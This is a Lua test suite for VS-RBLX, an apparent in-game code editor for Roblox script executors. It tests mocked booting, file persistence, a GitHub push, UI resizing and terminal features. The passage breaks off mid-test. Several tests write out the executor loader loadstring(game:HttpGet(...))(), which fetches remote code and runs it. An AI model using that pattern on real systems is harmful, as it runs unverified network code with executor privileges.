-- Comprehensive Offline Test Suite for VS-RBLX (`test/run.lua`)
-- Verifies exact `loadstring(game:HttpGet(.../dist/vsrblx.lua))()` boot with ZERO host
-- loadfile fallback, Executor `writefile`/`readfile` disk persistence, Executor HTTP GitHub
-- clone/pull/commit/push, Window drag + auto-resize + 8-edge/corner player resize,
-- 17-language RichText syntax lexer, and locked-CoreGui PlayerGui fallback.

package.path = "./?.lua;./?/init.lua;test/?.lua;test/mock/?.lua;" .. package.path

local mockEnv = require("env")
local json = require("json")

local passed = 0
local failed = 0

local function check(name, fn)
	local ok, err = xpcall(fn, debug.traceback)
	if ok then
		passed = passed + 1
		io.write("PASS  " .. name .. "\n")
	else
		failed = failed + 1
		io.write("FAIL  " .. name .. "\n      " .. tostring(err):gsub("\n", "\n      ") .. "\n")
	end
end

local function assertEq(actual, expected, label)
	if actual ~= expected then
		error(string.format("%s: expected %s, got %s", label or "assertEq", tostring(expected), tostring(actual)), 2)
	end
end

local function assertTrue(val, label)
	if not val then
		error(string.format("%s: expected truthy, got %s", label or "assertTrue", tostring(val)), 2)
	end
end

local fhBundle = assert(io.open("dist/vsrblx.lua", "rb"), "dist/vsrblx.lua missing")
local bundleSource = fhBundle:read("*a")
fhBundle:close()

local RAW_URL = "https://raw.githubusercontent.com/TheStrongestOfTomorrow/VS-RBLX/main/dist/vsrblx.lua"

local H = mockEnv.new({ width = 1440, height = 900 })
H.onHttp(function(_req, url)
	if url == RAW_URL then
		return { StatusCode = 200, Body = bundleSource }
	end
end)

local api = nil

check("1. Boot dist/vsrblx.lua via loadstring(game:HttpGet(...))() with zero loadfile", function()
	assertEq(H.sandbox.loadfile, nil, "No host loadfile exposed in executor sandbox")
	local loaderChunk = assert(H.sandbox.loadstring(
		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))()',
		"@executor"
	))
	local ok, res = pcall(loaderChunk)
	assertTrue(ok and type(res) == "table", "Executor loadstring booted cleanly: " .. tostring(res))
	api = res

	assertEq(api.version, "1.0.0", "SDK version")
	assertTrue(api.buildId:find("^1%.0%.0%-") ~= nil, "Deterministic FNV-1a build ID bound from __VSRBLX_BUILD")
	assertTrue(api._env.moduleTotal == 93, "All 93 __VSRBLX_MODULES registered in lexical table")
	assertTrue(H.sandbox.getgenv().VSRBLX == api, "Registered on getgenv().VSRBLX")

	-- First-boot Master Vault onboarding modal surfaces automatically and allows opting out ("Leave Unencrypted")
	assertTrue(H.byName("VaultSetupModal") ~= nil, "First-boot Zero-Knowledge Master Vault onboarding modal appeared")
	H.click(H.byName("VaultOptOutBtn"))
	assertEq(api.config.get("vault.mode"), "off", "Opting out on first boot keeps PATs unencrypted")
	assertEq(H.byName("VaultSetupModal"), nil, "Vault onboarding modal closed cleanly")

	local gui = H.screen()
	assertTrue(gui ~= nil and gui.Name == "VSRBLX_Workbench", "ScreenGui mounted inside gethui()")
	assertTrue(H.byName("VSCodeWindow") ~= nil, "VSCodeWindow exists")
	assertTrue(H.byName("TitleBar") ~= nil, "TitleBar exists")
	assertTrue(H.byName("ActivityBar") ~= nil, "ActivityBar exists")
	assertTrue(H.byName("PrimarySideBar") ~= nil, "PrimarySideBar exists")
	assertTrue(H.byName("PrimaryEditorPane") ~= nil, "PrimaryEditorPane exists")
	assertTrue(H.byName("BottomPanelContainer") ~= nil, "BottomPanelContainer exists")
	assertTrue(H.byName("StatusBar") ~= nil, "StatusBar exists")
end)

check("2. Executor Disk Persistence via writefile / readfile", function()
	assertTrue(api.fs.isBackedByDisk(), "fsx detected executor writefile/readfile")
	assertTrue(H.sandbox.isfile("VSRBLX/workspaces/default/src/main.luau"), "Starter Luau file written to disk")

	local sampleCode = "local Players = game:GetService('Players')\nprint('Loaded', #Players:GetPlayers())\n"
	local ok = api.writeFile("src/network_client.luau", sampleCode)
	assertTrue(ok, "api.writeFile succeeded")

	local rawOnDisk = H.sandbox.readfile("VSRBLX/workspaces/default/src/network_client.luau")
	assertEq(rawOnDisk, sampleCode, "Exact bytes written via executor writefile")
	assertEq(api.readFile("src/network_client.luau"), sampleCode, "Exact bytes read via executor readfile")

	local doc = api.openFile("src/network_client.luau")
	assertTrue(doc ~= nil, "Opened document tab")
	local updatedCode = sampleCode .. "-- Saved via Ctrl+S\n"
	api.codeStore.updateContent(doc.id, updatedCode)
	assertTrue(doc.dirty == true, "Document marked dirty")

	api.runCommand("file.save")
	assertTrue(doc.dirty == false, "Document clean after save")
	assertEq(H.sandbox.readfile("VSRBLX/workspaces/default/src/network_client.luau"), updatedCode, "Ctrl+S persisted via writefile")
end)

check("3. GitHub Repository Clone, Pull & Atomic Commit/Push via Executor HTTP", function()
	local pushedCommitPayload = nil
	local patchedRefPayload = nil

	H.onHttp(function(req, url, method)
		if url == "https://api.github.com/user" then
			return { StatusCode = 200, Body = { login = "RobloxArchitect", id = 42 } }
		elseif url == "https://api.github.com/repos/OctoDev/CombatEngine" then
			return { StatusCode = 200, Body = { full_name = "OctoDev/CombatEngine", default_branch = "main" } }
		elseif url:find("/repos/OctoDev/CombatEngine/branches") then
			return { StatusCode = 200, Body = { { name = "main" }, { name = "dev" } } }
		elseif url:find("git/trees/main%?recursive=1") then
			return {
				StatusCode = 200,
				Body = {
					sha = "tree_sha_001",
					tree = {
						{ path = "README.md", type = "blob", size = 38, sha = "b1" },
						{ path = "src/sword.luau", type = "blob", size = 64, sha = "b2" },
						{ path = "web/hud.ts", type = "blob", size = 48, sha = "b3" },
					},
				},
			}
		elseif url:find("raw%.githubusercontent%.com/OctoDev/CombatEngine/main/README%.md") then
			return { StatusCode = 200, Body = "# CombatEngine\nSynced via VS-RBLX\n" }
		elseif url:find("raw%.githubusercontent%.com/OctoDev/CombatEngine/main/src/sword%.luau") then
			return { StatusCode = 200, Body = "local Sword = {}\nfunction Sword.swing() return 25 end\nreturn Sword\n" }
		elseif url:find("raw%.githubusercontent%.com/OctoDev/CombatEngine/main/web/hud%.ts") then
			return { StatusCode = 200, Body = "export const MAX_HP: number = 100;\n" }
		elseif url:find("git/ref/heads/main") then
			return { StatusCode = 200, Body = { object = { sha = "head_commit_100" } } }
		elseif url:find("git/commits/head_commit_100") then
			return { StatusCode = 200, Body = { sha = "head_commit_100", tree = { sha = "base_tree_100" } } }
		elseif url:find("git/blobs") and method == "POST" then
			return { StatusCode = 201, Body = { sha = "new_blob_sha_200" } }
		elseif url:find("git/trees$") and method == "POST" then
			return { StatusCode = 201, Body = { sha = "new_tree_sha_200" } }
		elseif url:find("git/commits$") and method == "POST" then
			pushedCommitPayload = json.decode(req.Body)
			return { StatusCode = 201, Body = { sha = "pushed_commit_9999999" } }
		elseif url:find("git/refs/heads/main") and method == "PATCH" then
			patchedRefPayload = json.decode(req.Body)
			return { StatusCode = 200, Body = { ref = "refs/heads/main" } }
		end
	end)

	local user, authErr = api.github.authenticate("ghp_mocktoken123")
	assertTrue(user ~= nil, "Authenticated GitHub PAT: " .. tostring(authErr))
	assertEq(user.login, "RobloxArchitect", "GitHub username")

	local summary, cloneErr = api.cloneRepo("OctoDev/CombatEngine")
	assertTrue(summary ~= nil, "Cloned OctoDev/CombatEngine: " .. tostring(cloneErr))
	assertEq(summary.filesWritten, 3, "Wrote 3 repo files to disk")
	assertTrue(H.sandbox.isfile("VSRBLX/workspaces/OctoDev__CombatEngine/src/sword.luau"), "Cloned Luau file exists on executor disk")

	api.writeFile("src/sword.luau", "local Sword = {}\nfunction Sword.swing() return 50 end\nreturn Sword\n")
	local st = api.git.status()
	assertEq(st.total, 1, "Git status tracked 1 modified file")

	local pushRes, pushErr = api.commitAndPush("Buff sword swing damage to 50")
	assertTrue(pushRes ~= nil, "Committed and pushed to GitHub REST API: " .. tostring(pushErr))
	assertEq(pushRes.sha, "pushed_commit_9999999", "Returned new commit SHA")
	assertEq(pushedCommitPayload.message, "Buff sword swing damage to 50", "Commit message sent in HTTP POST")
	assertEq(patchedRefPayload.sha, "pushed_commit_9999999", "Branch ref fast-forwarded via HTTP PATCH")
end)

check("4. Window Dragging, Explicit Topbar Resize Toggle (⤢ ON/OFF), Viewport Auto-Resize & 8-Direction Resizing", function()
	local winRoot = H.byName("VSCodeWindow")
	local titleBar = H.byName("TitleBar")
	local resizeBtn = H.byName("ResizeModeBtn")
	local resizeBR = H.byName("ResizeBottomRight")
	local resizeTL = H.byName("ResizeTopLeft")

	assertTrue(winRoot and titleBar and resizeBtn and resizeBR and resizeTL, "Window, ResizeModeBtn & resize handles exist")
	assertEq(api.isResizeMode(), false, "Resize Mode is OFF by default so handles never hijack moving")
	assertEq(resizeBR.Visible, false, "Resize handles hidden when Resize Mode is OFF")

	api.runCommand("window.center")
	local initX = winRoot.Position.X.Offset
	local initY = winRoot.Position.Y.Offset
	local initW = winRoot.Size.X.Offset

	-- Dragging a corner while Resize Mode is OFF does NOT resize the window!
	H.drag(resizeBR, 800, 600, 890, 650)
	assertEq(winRoot.Size.X.Offset, initW, "Corner drag ignored while Resize Mode is OFF")

	-- (A) TitleBar Dragging by Player (works freely while Resize Mode is OFF; grab open TitleBar surface at +310px)
	local grabX1 = initX + 310
	H.drag(titleBar, grabX1, initY + 14, grabX1 + 60, initY + 49)
	assertEq(winRoot.Position.X.Offset, initX + 60, "Window dragged +60px horizontally")
	assertEq(winRoot.Position.Y.Offset, initY + 35, "Window dragged +35px vertically")

	-- (B) Turn ON Resize Mode via Topbar `⤢` Button -> Push/Pull Bottom-Right & Top-Left Handles!
	H.click(resizeBtn)
	assertEq(api.isResizeMode(), true, "Topbar ⤢ button turned Resize Mode ON")
	assertEq(resizeBR.Visible, true, "Push/Pull corner handle visible when Resize Mode is ON")
	assertEq(H.byName("ResizeModeBanner").Visible, true, "ResizeModeBanner pill visible")

	-- TitleBar move-dragging is paused while Resize Mode is ON so push/pull never fights moving
	local lockedMoveX = winRoot.Position.X.Offset
	H.drag(titleBar, lockedMoveX + 310, winRoot.Position.Y.Offset + 14, lockedMoveX + 360, winRoot.Position.Y.Offset + 40)
	assertEq(winRoot.Position.X.Offset, lockedMoveX, "TitleBar move-drag paused while Resize Mode is ON")

	local preW = winRoot.Size.X.Offset
	local preH = winRoot.Size.Y.Offset
	H.drag(resizeBR, 800, 600, 890, 650)
	assertTrue(winRoot.Size.X.Offset > preW, "Bottom-Right handle expanded window width")
	assertTrue(winRoot.Size.Y.Offset > preH, "Bottom-Right handle expanded window height")

	-- (C) Player Manual Resizing via Top-Left Corner Handle
	local preTLW = winRoot.Size.X.Offset
	H.drag(resizeTL, 200, 150, 240, 170)
	assertTrue(winRoot.Size.X.Offset < preTLW, "Top-Left handle shrunk window width inward")

	-- Turn OFF Resize Mode via Topbar `⤢` Button -> Locks custom size & restores TitleBar moving!
	H.click(resizeBtn)
	assertEq(api.isResizeMode(), false, "Topbar ⤢ button turned Resize Mode OFF")
	assertEq(resizeBR.Visible, false, "Push/Pull handles hidden again")
	H.advance(0.4) -- Clear double-click window before dragging TitleBar again
	local preMove2X = winRoot.Position.X.Offset
	H.drag(titleBar, preMove2X + 310, winRoot.Position.Y.Offset + 14, preMove2X + 280, winRoot.Position.Y.Offset + 14)
	assertEq(winRoot.Position.X.Offset, preMove2X - 30, "TitleBar move-drag works immediately after turning ⤢ OFF")

	-- (D) Auto-Resize on Viewport Change (shrinking screen to 820x520)
	H.setViewport(820, 520)
	assertTrue(winRoot.Size.X.Offset <= 820, "Auto-resize clamped window width to 820px viewport")
	assertTrue(winRoot.Size.Y.Offset <= 520, "Auto-resize clamped window height to 520px viewport")

	-- (E) Maximize / Restore (`F11`)
	H.setViewport(1440, 900)
	local usable = api._env.require("ui/responsive").usableRect(0)
	api.runCommand("window.maximize")
	assertEq(winRoot.Size.X.Offset, usable.width, "Maximized fills usable viewport width")
	assertEq(winRoot.Size.Y.Offset, usable.height, "Maximized fills usable viewport height")
	api.runCommand("window.maximize")
	assertTrue(winRoot.Size.X.Offset < usable.width, "Restored previous floating bounds")
end)

check("5. 17-Language Syntax Lexer, IntelliSense, Diagnostics, Search, Formatter & Terminal", function()
	local lexer = api._env.require("runtime/code_lexer")
	local languages = api._env.require("runtime/languages")
	local intellisense = api._env.require("runtime/intellisense")
	local diagnostics = api._env.require("runtime/diagnostics")
	local formatter = api._env.require("tools/formatter")
	local terminalCmds = api._env.require("tools/terminal_cmds")

	assertTrue(#languages.list >= 17, "At least 17 language definitions registered")

	local samples = {
		luau = "local function greet(name)\n\treturn 'Hello ' .. tostring(name)\nend",
		typescript = "export interface PlayerStats { score: number; active: boolean; }",
		python = "async def fetch_data(url: str) -> dict:\n    return {'ok': True}",
		rust = "pub fn compute(v: &[i32]) -> i32 { let mut sum = 0; sum }",
		cpp = "#include <vector>\nint main() { return 0; }",
		json = '{"name": "VS-RBLX", "version": 1, "enabled": true}',
		html = '<div class="ide"><span>Hello</span></div>',
		css = ".ide { background: #1e1e1e; color: #d4d4d4; }",
		sql = "SELECT id, username FROM players WHERE score >= 100 ORDER BY score DESC;",
	}
	for langId, code in pairs(samples) do
		local cache = lexer.scan(code, langId)
		local richLine = lexer.rich(cache.lines[1], cache.spans[1], api.theme.syntax)
		assertTrue(richLine:find("<font color=", 1, true) ~= nil, "Generated RichText syntax tags for " .. langId)
	end

	local sugs = intellisense.suggest("local x = writef", 17, "luau", 8)
	assertTrue(#sugs >= 1 and sugs[1].label == "writefile", "IntelliSense suggested executor writefile")

	local badJsonDoc = api.codeStore.newUntitled('{"unclosed": [1, 2}', "json")
	local jsonDiags = diagnostics.check(badJsonDoc)
	assertTrue(#jsonDiags >= 1, "JSON syntax checker caught invalid JSON")

	local uglyJson = '{"a":1,"b":[true,false]}'
	local prettyJson = formatter.formatText(uglyJson, "json")
	assertTrue(prettyJson:find("\n", 1, true) ~= nil, "JSON formatter pretty-printed object")

	terminalCmds.execute("ls")
	terminalCmds.execute("luau return 6 * 7")
	assertTrue(terminalCmds.lines[#terminalCmds.lines]:find("42", 1, true) ~= nil, "Terminal REPL evaluated 6 * 7 = 42")

	api.runCommand("editor.toggleSplit")
	assertTrue(api.codeStore.splitOpen == true, "Split editor enabled")
	api.runCommand("editor.toggleSplit")
	assertTrue(api.codeStore.splitOpen == false, "Split editor closed")

	for _, th in ipairs(api.theme.list()) do
		assertTrue(api.setTheme(th.id), "Switched to theme " .. th.id)
	end
	api.setTheme("dark_plus")
end)

check("6. Phase 1 QoL: Ghost Opacity, Zen Mode, Seti Icons, Inline Explorer, Dirty Prompt & TODOs", function()
	-- (A) Ghost-Coding Opacity Slider (`30%–100%`)
	assertTrue(H.byName("OpacitySliderPill") ~= nil, "OpacitySliderPill mounted in TitleBar")
	assertEq(api.getOpacity(), 1.0, "Default opacity is 100%")
	api.setOpacity(0.45)
	assertEq(api.getOpacity(), 0.45, "Opacity updated to 45%")
	local editorsRegion = H.byName("EditorsRegion")
	assertTrue(math.abs(editorsRegion.BackgroundTransparency - 0.55) < 0.01, "EditorsRegion became 55% transparent without stacking")
	api.setOpacity(0.10)
	assertEq(api.getOpacity(), 0.30, "Opacity clamped at 30% minimum")
	api.runCommand("window.opacityReset")
	assertEq(api.getOpacity(), 1.0, "window.opacityReset restored 100% opacity")

	-- (B) Zen Mode (`Ctrl+Shift+Z`) enter & exact layout state restore
	local actBar = H.byName("ActivityBar")
	local sideBar = H.byName("PrimarySideBar")
	local statusBar = H.byName("StatusBar")
	local zenPill = H.byName("ZenExitPill")
	assertTrue(actBar.Visible == true and sideBar.Visible == true and statusBar.Visible == true, "Chrome visible before Zen Mode")
	api.toggleZenMode()
	assertTrue(api.app.isZenMode() == true, "Zen Mode active")
	assertTrue(actBar.Visible == false and sideBar.Visible == false and statusBar.Visible == false, "Chrome hidden in Zen Mode")
	assertTrue(zenPill.Visible == true, "Floating ZenExitPill shown")
	api.toggleZenMode()
	assertTrue(api.app.isZenMode() == false, "Zen Mode exited")
	assertTrue(actBar.Visible == true and sideBar.Visible == true and statusBar.Visible == true, "Pre-Zen layout restored")

	-- (C) Crisp Seti File Badges
	assertTrue(H.byName("SetiBadge") ~= nil, "Seti file badges rendered in Explorer & Tabs")

	-- (D) Inline Explorer Create + Validation + Inline Rename (preserving open tab)
	local tree = api.app.viewlets.explorer.fileTree
	tree.promptNewFile("src")
	assertTrue(H.byName("InlineExplorerInput") ~= nil, "Inline Explorer TextBox rendered directly inside file tree")
	local badOk, badErr = tree.commitInline("bad:name?.luau")
	assertTrue(badOk == false and badErr ~= nil, "Inline Explorer rejected invalid filename characters")
	assertTrue(H.byName("InlineErrorBanner").Visible == true, "Inline validation error banner displayed")

	local createOk, createdPath = tree.commitInline("abilities.luau")
	assertTrue(createOk == true and createdPath == "src/abilities.luau", "Inline Explorer created src/abilities.luau")
	local abilDoc = api.codeStore.findByPath("src/abilities.luau")
	assertTrue(abilDoc ~= nil, "Newly created file automatically opened in editor")
	api.codeStore.updateContent(abilDoc.id, "-- TODO: balance cooldowns\n-- FIXME: fix mana cost\nreturn { dash = 5 }\n")

	-- Inline rename open file -> keeps open tab & undo stack intact!
	assertTrue(tree.startRename("src/abilities.luau"), "Started inline rename on src/abilities.luau")
	local renOk, renPath = tree.commitInline("skills.luau")
	assertTrue(renOk == true and renPath == "src/skills.luau", "Renamed to src/skills.luau on disk")
	local renamedDoc = api.codeStore.findByPath("src/skills.luau")
	assertTrue(renamedDoc == abilDoc and renamedDoc.title == "skills.luau", "Open tab seamlessly re-bound on rename")
	assertTrue(#renamedDoc.undoStack >= 1, "Undo stack preserved across inline rename")

	-- (E) TODO / FIXME / NOTE Lexer Highlighting & Workspace Scanner
	local lexer = api._env.require("runtime/code_lexer")
	local scanned = lexer.scan(renamedDoc.content, "luau")
	local richTodo = lexer.rich(scanned.lines[1], scanned.spans[1], api.theme.syntax)
	assertTrue(richTodo:find("#ffcc00", 1, true) ~= nil, "Lexer highlighted TODO: in bold gold")
	local richFixme = lexer.rich(scanned.lines[2], scanned.spans[2], api.theme.syntax)
	assertTrue(richFixme:find("#f14c4c", 1, true) ~= nil, "Lexer highlighted FIXME: in bold red")

	local todoItems, todoCounts = api.todos.scanAll()
	assertTrue(todoCounts.total >= 2 and todoCounts.fixme >= 1 and todoCounts.todo >= 1, "todo_scanner indexed TODO & FIXME tags")
	api.runCommand("view.todos")
	assertTrue(H.byName("TodosView").Visible == true, "view.todos focused Bottom Panel TODOS tab")

	-- (F) Dirty-Tab Close Confirmation Prompt (Save / Don't Save / Cancel)
	assertTrue(renamedDoc.dirty == true, "skills.luau is dirty before close")
	local closeRes = api.codeStore.requestClose(renamedDoc.id)
	assertEq(closeRes, "prompted", "Dirty tab close opened confirmation modal instead of losing work")
	assertTrue(H.byName("ConfirmModal") ~= nil, "VS Code ConfirmModal mounted")
	-- Click "Save" (`ConfirmPrimaryBtn`) to save to disk and close cleanly
	H.click(H.byName("ConfirmPrimaryBtn"))
	assertTrue(api.codeStore.findByPath("src/skills.luau") == nil, "Tab closed after confirming Save")
	assertTrue(H.sandbox.readfile("VSRBLX/workspaces/OctoDev__CombatEngine/src/skills.luau"):find("FIXME: fix mana cost", 1, true) ~= nil, "Confirm Save persisted buffer via writefile")
end)

check("7. Combined Phase 2+3: Monaco Smart Typing, Color Picker, Clipboard 15-Ring, Visuals & Crash Recovery", function()
	-- (A) 15-Slot Persistent Clipboard Ring
	api.clipboard.clear()
	for i = 1, 18 do
		api.clipboard.copy("snippet_" .. tostring(i))
	end
	local hist = api.clipboard.list()
	assertEq(#hist, 15, "Clipboard ring capped at 15 slots")
	assertEq(hist[1].text, "snippet_18", "Most recent copy at slot 1")
	api.clipboard.copy("snippet_10")
	assertEq(api.clipboard.list()[1].text, "snippet_10", "Duplicate copy promoted to slot 1 without growing past 15")

	-- (B) Smart Typing: Auto-close pairs, Overtype, Empty-Pair Backspace, Smart Enter Indent & `{}` Expansion
	local ea = api.editorActions
	local paired, cur1 = ea.applySmartTyping("local t = ", "local t = {", 12, { langId = "luau", tabSize = 4, insertSpaces = true })
	assertEq(paired, "local t = {}", "Auto-closed { -> {}")
	assertEq(cur1, 12, "Cursor placed between { and }")

	local expanded, cur2 = ea.applySmartTyping("local t = {}", "local t = {\n}", 13, { langId = "luau", tabSize = 4, insertSpaces = true })
	assertEq(expanded, "local t = {\n    \n}", "Smart Enter between {} expanded 3-line indented block")
	assertEq(cur2, 17, "Cursor positioned at inner indent stop")

	local overtyped, cur3 = ea.applySmartTyping("call()", "call())", 7, { langId = "luau" })
	assertEq(overtyped, "call()", "Closing ) overtyped instead of duplicating")
	assertEq(cur3, 7, "Cursor stepped past closing )")

	local bsPair, cur4 = ea.applySmartTyping("call()", "call)", 5, { langId = "luau" })
	assertEq(bsPair, "call", "Backspacing opening ( in empty () removed both")
	assertEq(cur4, 5, "Cursor stayed clean after pair backspace")

	local luauIf, _ = ea.applySmartTyping("if ready then", "if ready then\n", 15, { langId = "luau", tabSize = 4, insertSpaces = true })
	assertEq(luauIf, "if ready then\n    ", "Smart Enter after Luau `then` auto-indented 4 spaces")

	-- (C) Live Editor Actions: Comment Toggle (`Ctrl+/`), Move Line, Duplicate, Delete, Undo/Redo
	api.writeFile("src/theme_demo.luau", table.concat({
		"local function paintHero(card)",
		"    local accent = Color3.fromRGB(255, 85, 119)",
		"    local glow = '#4ec9b0'",
		"    return { card = (accent) }",
		"end",
	}, "\n"))
	local demoDoc = api.openFile("src/theme_demo.luau")
	local ed = api.app.primaryEditor
	ed.box.CursorPosition = 1
	ed.box.SelectionStart = -1

	api.runCommand("editor.toggleComment")
	assertTrue(demoDoc.content:find("^%-%- local function paintHero") ~= nil, "Ctrl+/ commented Luau line")
	api.runCommand("editor.toggleComment")
	assertTrue(demoDoc.content:find("^local function paintHero") ~= nil, "Ctrl+/ uncommented Luau line")

	api.runCommand("editor.duplicateLineDown")
	local dupLines = api._env.require("runtime/util").lines(demoDoc.content)
	assertEq(dupLines[1], dupLines[2], "Shift+Alt+Down duplicated line 1")

	api.runCommand("edit.undo")
	assertEq(#api._env.require("runtime/util").lines(demoDoc.content), 5, "Ctrl+Z undid line duplication")
	api.runCommand("edit.redo")
	assertEq(#api._env.require("runtime/util").lines(demoDoc.content), 6, "Ctrl+Y redid line duplication")
	api.runCommand("edit.undo")

	-- (D) Inline Color Swatches + HSV Color Picker Format-Preserving Rewrite
	local swatch1 = H.byName("ColorSwatch_1")
	assertTrue(swatch1 ~= nil and swatch1.Visible == true, "Inline ColorSwatch_1 rendered for Color3.fromRGB(255, 85, 119)")
	H.click(swatch1)
	assertTrue(H.byName("InlineColorPicker").Visible == true, "Clicking swatch opened HSV InlineColorPicker")
	ed.colorPicker.setRgb(16, 200, 140)
	assertTrue(demoDoc.content:find("Color3.fromRGB(16, 200, 140)", 1, true) ~= nil, "HSV Color Picker rewrote Color3.fromRGB in-place")
	ed.colorPicker.close()

	-- (E) Rainbow Brackets, Indent Guides, Sticky Scroll & Inline Error Squiggles
	local lexer = api._env.require("runtime/code_lexer")
	local nestScan = lexer.scan("call(outer[inner{1}])", "luau")
	local richNest = lexer.rich(nestScan.lines[1], nestScan.spans[1], api.theme.syntax)
	assertTrue(richNest:find("#ffd700", 1, true) ~= nil and richNest:find("#da70d6", 1, true) ~= nil and richNest:find("#179fff", 1, true) ~= nil,
		"Rainbow brackets colored depth 1/2/3 in gold, orchid, and blue")

	assertTrue(H.byName("IndentGuide_1") ~= nil and H.byName("IndentGuide_1").Visible == true, "Vertical indent guides rendered")

	-- Scroll past line 1 inside `paintHero` -> Sticky Scroll bar pins `local function paintHero(card)`
	H.byName("EditorScroll").CanvasPosition = H.sandbox.Vector2.new(0, 42)
	assertTrue(H.byName("StickyScrollBar").Visible == true, "StickyScrollBar pinned enclosing function signature while scrolling")
	H.byName("EditorScroll").CanvasPosition = H.sandbox.Vector2.new(0, 0)

	-- Syntax error triggers inline squiggle underline + Error Lens
	api.codeStore.updateContent(demoDoc.id, "local broken = (\n")
	api._env.require("runtime/diagnostics").check(demoDoc)
	ed.refresh()
	assertTrue(H.byName("DiagUnderline_1") ~= nil and H.byName("DiagUnderline_1").Visible == true, "Inline error squiggle underline rendered")
	assertTrue(H.byName("ErrorLens_1") ~= nil and H.byName("ErrorLens_1").Visible == true, "Inline Error Lens message rendered")

	-- (F) Keymap Preset Switcher
	api.runCommand("workbench.keymapPreset")
	assertEq(api.config.get("keybindings.preset"), "sublime", "Cycled keymap preset to sublime")
	api.config.set("keybindings.preset", "vscode", { immediate = true })

	-- (G) Crash-Proof Session & Unsaved Draft Auto-Recovery across reboot
	api.codeStore.updateContent(demoDoc.id, "-- UNSAVED_CRASH_DRAFT_MARKER_999\nreturn true\n")
	assertTrue(demoDoc.dirty == true, "Buffer is dirty and NOT saved via Ctrl+S")
	assertTrue(api.session.saveNow() == true, "Session journal snapshot written to disk")

	-- Simulate abrupt reload with `reload = true` and verify unsaved draft is restored!
	local rebootChunk = assert(H.sandbox.loadstring(
		'return loadstring(game:HttpGet("' .. RAW_URL .. '"))({ reload = true })',
		"@executor_reboot"
	))
	local rebootedApi = rebootChunk()
	assertTrue(rebootedApi ~= nil and rebootedApi ~= api, "Fresh VSRBLX instance mounted after simulated crash")
	api = rebootedApi
	local recoveredDoc = api.codeStore.findByPath("src/theme_demo.luau")
	assertTrue(recoveredDoc ~= nil and recoveredDoc.dirty == true, "Session journal reopened dirty tab")
	assertTrue(recoveredDoc.content:find("UNSAVED_CRASH_DRAFT_MARKER_999", 1, true) ~= nil, "Exact unsaved draft content recovered after reboot!")
end)

check("8. Combined Sprint 3: Multi-Session Terminal, Roblox LogService & Eyedropper, Bundler, Side-by-Side Diff, Gist & Settings Sync", function()
	-- (A) Multi-Session Terminal + UNIX CLI + History + Tab Autocomplete
	local sess1 = api.terminal.activeSession()
	local okTerm, sess2 = api.runCommand("terminal.newSession")
	assertTrue(okTerm and sess2 ~= nil and sess2.id ~= sess1.id, "Created second terminal session")
	assertEq(#api.terminal.sessions, 2, "Two concurrent terminal sessions active")

	api.terminal.execute('echo "return { answer = 42 }" > src/helper_mod.luau')
	assertTrue(api.readFile("src/helper_mod.luau"):find("answer = 42", 1, true) ~= nil, "Terminal echo > redirection wrote src/helper_mod.luau")
	api.terminal.execute("cp src/helper_mod.luau src/helper_copy.luau")
	assertTrue(api.workspace.exists("src/helper_copy.luau"), "Terminal cp copied file on disk")
	api.terminal.execute("mv src/helper_copy.luau src/helper_renamed.luau")
	assertTrue(api.workspace.exists("src/helper_renamed.luau") and not api.workspace.exists("src/helper_copy.luau"), "Terminal mv renamed file on disk")
	api.terminal.execute("tree src")
	api.terminal.execute("ls -l src")
	api.terminal.execute("wc src/helper_mod.luau")
	api.terminal.execute("grep answer")

	assertEq(api.terminal.historyPrev(), "grep answer", "Terminal Up-arrow history recalled last command")
	assertEq(api.terminal.historyPrev(), "wc src/helper_mod.luau", "Terminal Up-arrow history walked backward")
	assertEq(api.terminal.historyNext(), "grep answer", "Terminal Down-arrow history walked forward")

	local compCmd = api.terminal.autocomplete("bun")
	assertEq(compCmd, "bundle", "Tab autocomplete expanded `bun` -> `bundle`")
	local compGitPrefix = api.terminal.autocomplete("git st")
	assertEq(compGitPrefix, "git sta", "Tab autocomplete expanded common prefix `git st` -> `git sta` (stage/status)")
	local compGit = api.terminal.autocomplete("git stag")
	assertEq(compGit, "git stage", "Tab autocomplete expanded `git stag` -> `git stage`")
	local compPath = api.terminal.autocomplete("cat src/helper_r")
	assertEq(compPath, "cat src/helper_renamed.luau", "Tab autocomplete expanded workspace file path")

	assertTrue(api.terminal.closeSession(sess2.id) == true, "Closed second terminal session")
	assertEq(api.terminal.activeSessionId, sess1.id, "Returned to primary terminal session")

	-- (B) Live Roblox LogService Stream + Clickable Stack-Trace Jump
	api.writeFile("src/stack_target.luau", "local a = 1\nlocal b = 2\nerror('boom')\n")
	H.logService.MessageOut:Fire("[string \"src/stack_target.luau\"]:3: attempt to index nil", H.Enum.MessageType.MessageError)
	local rblxLogs = api._env.require("runtime/log").list("roblox")
	assertTrue(#rblxLogs >= 1, "LogService.MessageOut streamed error into roblox output channel")
	local jumped = api.robloxConsole.jumpToLogEntry(rblxLogs[#rblxLogs])
	assertTrue(jumped == true, "Clicked stack trace jumped to matching workspace file")
	assertEq(api.codeStore.active().path, "src/stack_target.luau", "Opened stack trace target file")
	assertEq(api.codeStore.active().view.line, 3, "Jumped directly to error line 3")

	-- (C) Roblox DataModel Luau Path Generator, CLI & 3D Eyedropper Instance Picker
	local brickPath = api.robloxExplorer.luauPathOf(H.killBrick)
	assertEq(brickPath, 'workspace.ArenaMap["Lava Platform"]', "Generated bracket-escaped Luau path for 3D Part")
	local resolvedInst = api.robloxExplorer.resolvePath('workspace.ArenaMap["Lava Platform"]')
	assertTrue(resolvedInst == H.killBrick, "robloxExplorer.resolvePath resolved bracketed path back to Part")
	local props = api.robloxExplorer.inspectProperties(H.killBrick)
	assertTrue(#props >= 3, "robloxExplorer.inspectProperties extracted Instance properties")

	local scratchDoc = api.openFile("src/eyetest.luau") or api.codeStore.newUntitled("", "luau")
	api.writeFile("src/eyetest.luau", "local part = ")
	scratchDoc = api.openFile("src/eyetest.luau", { reloadFromDisk = true })
	api.app.primaryEditor.box.CursorPosition = #scratchDoc.content + 1
	api.app.primaryEditor.box.SelectionStart = -1

	api.runCommand("roblox.pickInstance")
	assertTrue(api.instancePicker.active == true, "Eyedropper mode activated and temporarily hid main window")
	-- Simulate clicking in 3D viewport where mouse.Target == H.killBrick
	H.uis.InputBegan:Fire({
		UserInputType = H.Enum.UserInputType.MouseButton1,
		Position = H.dt.Vector3.new(500, 400, 0),
	})
	assertTrue(api.instancePicker.active == false, "Eyedropper completed on 3D click and restored window")
	assertEq(scratchDoc.content, 'local part = workspace.ArenaMap["Lava Platform"]', "Eyedropper inserted exact Luau path at cursor!")

